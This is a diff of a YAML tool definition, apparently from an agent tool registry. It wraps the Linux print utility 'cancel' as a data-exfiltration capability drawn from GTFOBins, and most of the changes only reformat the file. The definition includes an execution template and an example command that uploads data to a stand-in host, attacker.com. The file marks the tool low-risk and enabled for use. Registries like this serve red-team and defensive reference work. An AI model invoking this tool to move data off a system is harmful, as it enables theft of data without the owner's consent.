@@ -3,21 +3,21 @@ id: system-print-cancel
 namespace: system:print:cancel
 name: cancel
 description: Cancel CUPS print jobs, can exfiltrate data via HTTP POST requests.
-author: "GTFOBins"
-version: "1.0.0"
+author: GTFOBins
+version: 1.0.0
 capabilities:
-  - network.transfer.upload
+- network.transfer.upload
 platforms:
-  - linux
+- linux
 risk_level: low
 trust_level: community
 execution_policy: enabled
 architectures:
-  - amd64
-  - arm64
+- amd64
+- arm64
 dependencies: []
 related_tools:
-  - lp
+- lp
 artifacts: []
 workflow_edges:
   produces: []
@@ -25,10 +25,10 @@ workflow_edges:
 contract:
   inputs: []
   outputs:
-    - type: process.output
-      description: Command output
+  - type: process.output
+    description: Command output
   side_effects:
-    - network_traffic
+  - network_traffic
   resource_cost:
     cpu: low
     memory_mb: 4
@@ -40,36 +40,41 @@ resource_profile:
   network: low
   disk_io: low
 allowed-tools:
-  - cancel
-  - Bash
-  - execFile
+- cancel
+- Bash
+- execFile
 parameters:
-  - name: dest
-    type: string
-    required: false
-    description: "Destination host and port"
-  - name: data
-    type: string
-    required: false
-    description: "Data to upload"
-features: []
+- name: dest
+  type: string
+  required: false
+  description: Destination host and port
+- name: data
+  type: string
+  required: false
+  description: Data to upload
+features:
+- network-intensive
+- pipes-stdout
+- process-manip
 execution:
-  template: "cancel -h {dest} -u {data}"
+  template: cancel -h {dest} -u {data}
   sandbox: execFile
   timeout_seconds: 30
   shell: false
 global_vars: {}
 examples:
-  - description: Exfiltrate data via cancel HTTP POST
-    command: cancel -h attacker.com:12345 -u DATA
+- description: Exfiltrate data via cancel HTTP POST
+  command: cancel -h attacker.com:12345 -u DATA
 references:
-  - label: "GTFOBins"
-    url: "https://gtfobins.github.io/gtfobins/cancel/"
+- label: GTFOBins
+  url: https://gtfobins.github.io/gtfobins/cancel/
 techniques:
-  - exfiltration
+- exfiltration
 install:
-  - method: apt
-    package_name: "cups-client"
-    commands:
-      - "apt-get install -y cups-client"
+- method: apt
+  package_name: cups-client
+  commands:
+  - apt-get install -y cups-client
 ---
+
+
